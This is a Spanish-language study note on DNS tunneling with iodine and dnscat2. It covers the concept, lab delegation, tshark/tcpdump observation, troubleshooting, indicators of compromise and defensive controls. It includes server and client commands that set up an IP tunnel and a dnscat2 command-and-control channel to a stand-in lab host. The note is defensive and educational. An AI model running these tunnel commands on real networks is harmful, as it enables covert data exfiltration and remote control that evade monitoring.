---
title: DNS Tunneling con iodine y dnscat2
tags: [networking, dns, tunneling, exfiltration, c2]
aliases: [DNS Tunneling, iodine, dnscat2, C2 sobre DNS]
created: 2026-04-23
difficulty: Avanzado
related:
  - "[[dns-jerarquia-resolucion]]"
  - "[[dig-nslookup-host-drill]]"
  - "[[udp-vs-tcp-cuando-cual]]"
  - "[[dns-caching-forwarders-dnsmasq-unbound]]"
---

# DNS Tunneling con iodine y dnscat2

## TL;DR

- DNS tunneling encapsula datos dentro de consultas y respuestas DNS para atravesar controles o exfiltrar información.
- `iodine` prioriza transportar IP sobre DNS; `dnscat2` está más orientado a canal interactivo/C2.
- Funciona porque DNS suele estar permitido, pero eso no significa que pase desapercibido: volumen, longitud, entropía y timing delatan bastante.
- Es un tema para entender, detectar y laburar en entornos autorizados. En producción ajena, esto es abuso directo.
- Defensivamente, el mejor control no es "bloquear todo DNS", sino centralizar resolución, registrar bien y detectar patrones anómalos.

## Concepto

DNS tunneling consiste en esconder payload dentro de nombres de dominio o respuestas DNS para construir un canal de datos sobre un protocolo pensado para resolución. En vez de preguntar algo humano como `www.example.com`, el cliente genera labels largas y raras que contienen fragmentos de información.

Ejemplo conceptual:

```ascii
Dato real  ->  codificacion/base32/base64-like  ->  labels DNS  ->  query
```

Ese query llega a un dominio controlado por el operador del túnel, cuyo servidor autoritativo decodifica el contenido y arma la conversación.

El valor de esto para un atacante es obvio:

- DNS suele salir por perímetro;
- muchos controles lo inspeccionan poco;
- es fácil mezclarlo con tráfico legítimo si el entorno está mal gobernado.

El costo también es obvio:

- baja capacidad;
- mucha latencia;
- ruido estadístico muy visible para quien mire bien.

> [!note]
> DNS tunneling no es "magia sigilosa". Es más parecido a querer pasar cajas por la ranura del correo: puede funcionar, pero el patrón termina llamando la atención.

## Cómo funciona

### Esquema general

```ascii
Host comprometido
    |
    | consultas DNS con payload embebido
    v
Resolver corporativo / forwarder
    |
    | recursion / forwarding
    v
Autoritativo del dominio tunelado
    |
    | extrae payload y responde con datos de vuelta
    v
Servidor del operador
```

### Técnica base

1. El cliente toma bytes de datos.
2. Los codifica en un alfabeto compatible con labels DNS.
3. Los divide para respetar límites:
   - 63 bytes por label;
   - 255 bytes aprox. por nombre completo.
4. Arma consultas a un subdominio controlado, por ejemplo `x1ab2.payload.lab.example`.
5. El servidor autoritativo recibe la consulta, decodifica y responde con fragmentos de vuelta.

### `iodine`

`iodine` implementa un túnel IP sobre DNS. En laboratorio permite ver cómo una sesión DNS puede transportar tráfico encapsulado.

Modelo mental:

```ascii
IP packet -> iodine client -> DNS query/response -> iodine server -> red remota
```

### `dnscat2`

`dnscat2` apunta más a mensajería/C2 y shell remota sobre DNS que a un túnel IP completo. La semántica del canal es distinta: menos "network stack general" y más "intercambio de mensajes y comandos".

## Comandos / configuración

> [!warning]
> Lo siguiente es para laboratorio controlado y segmentado, usando un dominio propio como `lab.example` y autorizacion explicita. No lo uses fuera de un entorno de prueba.

### Requisitos de laboratorio

- dominio bajo tu control;
- delegación del subdominio de túnel hacia tu autoritativo;
- reachability DNS entre cliente, resolver y autoritativo;
- logs habilitados en resolver y servidor para observar el comportamiento.

### Delegación conceptual

Zona padre:

```dns
tun.lab.example. 300 IN NS ns1.tun.lab.example.
ns1.tun.lab.example. 300 IN A 203.0.113.53
```

### `iodine` en laboratorio

Servidor:

```bash
sudo iodined -f -c -P 'LabPass-2026' 10.10.10.1 tun.lab.example
```

Cliente:

```bash
sudo iodine -f -P 'LabPass-2026' tun.lab.example
```

Una vez levantado, inspeccionás la interfaz tun creada:

```bash
ip addr show
ip route show
```

### `dnscat2` en laboratorio

Servidor:

```bash
ruby /opt/dnscat2/server/dnscat2.rb tun.lab.example
```

Cliente:

```bash
/opt/dnscat2/client/dnscat --dns server=203.0.113.53,domain=tun.lab.example
```

### Observación de tráfico

```bash
tcpdump -ni eth0 port 53
```

Filtros útiles para mirar queries largas:

```bash
tshark -i eth0 -Y 'dns.qry.name contains "tun.lab.example"'
```

### Telemetría defensiva

Si tu resolver central registra queries, buscá:

- labels inusualmente largas;
- alto volumen hacia un mismo dominio;
- muchos `TXT` o `NULL` si la implementación los usa;
- `NXDOMAIN` masivos asociados a payload fragmentado;
- entropía alta en subdominios.

## Troubleshooting

| Síntoma | Causa probable | Comando de diagnóstico |
|---------|----------------|------------------------|
| El túnel no levanta | Delegación `NS` incorrecta o autoritativo inaccesible | `dig tun.lab.example NS` y `dig @203.0.113.53 tun.lab.example SOA` |
| Hay queries pero no respuesta útil | El resolver intermedio filtra tipos, trunca o reescribe | `tcpdump -ni eth0 port 53` en cliente y servidor |
| Rendimiento pésimo | MTU lógica demasiado alta, fragmentación o RTT elevado | ajustar parámetros de la herramienta y observar retransmisiones |
| El dominio resuelve pero el canal es inestable | Caché, TTL o política del resolver interfiriendo con el intercambio | revisar TTLs, logs y comportamiento del recursor |
| El SOC lo detecta rápido | Patrones de longitud/entropía/volumen evidentes | analizar logs del resolver y PCAP para tunear el lab |

### Validaciones mínimas antes de culpar a la herramienta

1. La delegación de `NS` existe y responde.
2. El autoritativo del túnel recibe queries desde internet o desde el segmento de prueba.
3. No hay middleboxes rompiendo UDP/TCP 53.
4. El dominio usado coincide exactamente con la configuración de cliente y servidor.

> [!tip]
> Si querés aprender de verdad, primero observá el tráfico con `tcpdump` y entendé el patrón. Levantar la herramienta sin mirar el wire te deja ciego.

## Seguridad / ofensiva

### Por qué preocupa

DNS tunneling puede servir para:

- exfiltrar texto, credenciales o pequeños blobs;
- establecer un canal de mando y control degradado;
- puentear segmentaciones donde solo DNS tiene salida;
- probar madurez de monitoreo DNS en un ejercicio autorizado.

### Limitaciones reales

- throughput bajo;
- latencia alta;
- susceptibilidad a caché, normalización y límites del protocolo;
- dependencia fuerte del resolver intermedio;
- detección estadística relativamente accesible para un blue team serio.

### Indicadores de compromiso frecuentes

- subdominios con alta entropía;
- labels cercanos al tamaño máximo;
- ráfagas de miles de queries al mismo dominio raro;
- uso anómalo de `TXT`, `NULL` o respuestas poco comunes;
- relaciones extrañas entre tamaño de consulta y respuesta;
- hosts que generan mucha actividad DNS pero casi nada de tráfico de aplicación normal.

> [!danger]
> Si una red permite que cualquier host consulte autoritativos externos arbitrarios sin pasar por resolvers controlados, el problema no es solo tunneling. Es pérdida de gobernanza sobre una de las capas más críticas del perímetro.

### Controles defensivos efectivos

- forzar uso de resolvers corporativos;
- bloquear egress DNS directo salvo excepciones justificadas;
- registrar queries y respuestas en el resolver;
- alertar por longitud de labels, entropía y volumen;
- correlacionar DNS anómalo con endpoints y procesos origen;
- usar sinkhole o políticas RPZ donde el modelo operativo lo permita.

## Relacionado

- [[dns-jerarquia-resolucion]]
- [[dig-nslookup-host-drill]]
- [[udp-vs-tcp-cuando-cual]]
- [[dns-caching-forwarders-dnsmasq-unbound]]

## Referencias

- RFC 1034 - *Domain Names - Concepts and Facilities*
- RFC 1035 - *Domain Names - Implementation and Specification*
- RFC 7766 - *DNS Transport over TCP - Implementation Requirements*
- `man 8 tcpdump`
- Wireshark Display Filter Reference: DNS
- iodine official documentation
- dnscat2 official documentation
